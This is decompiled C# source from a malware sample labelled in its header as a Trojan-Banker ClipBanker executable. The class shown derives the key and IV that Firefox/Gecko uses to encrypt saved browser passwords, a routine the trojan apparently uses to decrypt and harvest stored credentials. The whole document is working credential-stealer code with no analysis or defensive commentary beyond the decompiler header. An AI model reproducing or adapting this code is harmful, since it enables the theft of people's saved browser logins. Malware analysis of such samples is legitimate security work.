// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Browsers.Gecko.GeckoPasswordBasedEncryption
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Security.Cryptography;

namespace FtpClient.Data.Browsers.Gecko
{
  public class GeckoPasswordBasedEncryption
  {
    private byte[] _globalSalt { get; }

    private byte[] _masterPassword { get; }

    private byte[] _entrySalt { get; }

    public byte[] DataKey { get; private set; }

    public byte[] DataIV { get; private set; }

    public GeckoPasswordBasedEncryption(byte[] salt, byte[] password, byte[] entry)
    {
      this._globalSalt = salt;
      this._masterPassword = password;
      this._entrySalt = entry;
    }

    public void Init()
    {
      SHA1 shA1 = (SHA1) new SHA1CryptoServiceProvider();
      byte[] numArray1 = new byte[this._globalSalt.Length + this._masterPassword.Length];
      Array.Copy((Array) this._globalSalt, 0, (Array) numArray1, 0, this._globalSalt.Length);
      Array.Copy((Array) this._masterPassword, 0, (Array) numArray1, this._globalSalt.Length, this._masterPassword.Length);
      byte[] hash1 = shA1.ComputeHash(numArray1);
      byte[] numArray2 = new byte[hash1.Length + this._entrySalt.Length];
      Array.Copy((Array) hash1, 0, (Array) numArray2, 0, hash1.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray2, hash1.Length, this._entrySalt.Length);
      byte[] hash2 = shA1.ComputeHash(numArray2);
      byte[] numArray3 = new byte[20];
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray3, 0, this._entrySalt.Length);
      for (int length = this._entrySalt.Length; length < 20; ++length)
        numArray3[length] = (byte) 0;
      byte[] numArray4 = new byte[numArray3.Length + this._entrySalt.Length];
      Array.Copy((Array) numArray3, 0, (Array) numArray4, 0, numArray3.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) numArray4, numArray3.Length, this._entrySalt.Length);
      byte[] hash3;
      byte[] hash4;
      using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
      {
        hash3 = hmacshA1.ComputeHash(numArray4);
        byte[] hash5 = hmacshA1.ComputeHash(numArray3);
        byte[] numArray5 = new byte[hash5.Length + this._entrySalt.Length];
        Array.Copy((Array) hash5, 0, (Array) numArray5, 0, hash5.Length);
        Array.Copy((Array) this._entrySalt, 0, (Array) numArray5, hash5.Length, this._entrySalt.Length);
        hash4 = hmacshA1.ComputeHash(numArray5);
      }
      byte[] destinationArray = new byte[hash3.Length + hash4.Length];
      Array.Copy((Array) hash3, 0, (Array) destinationArray, 0, hash3.Length);
      Array.Copy((Array) hash4, 0, (Array) destinationArray, hash3.Length, hash4.Length);
      this.DataKey = new byte[24];
      for (int index = 0; index < this.DataKey.Length; ++index)
        this.DataKey[index] = destinationArray[index];
      this.DataIV = new byte[8];
      int index1 = this.DataIV.Length - 1;
      for (int index2 = destinationArray.Length - 1; index2 >= destinationArray.Length - this.DataIV.Length; --index2)
      {
        this.DataIV[index1] = destinationArray[index2];
        --index1;
      }
    }
  }
}
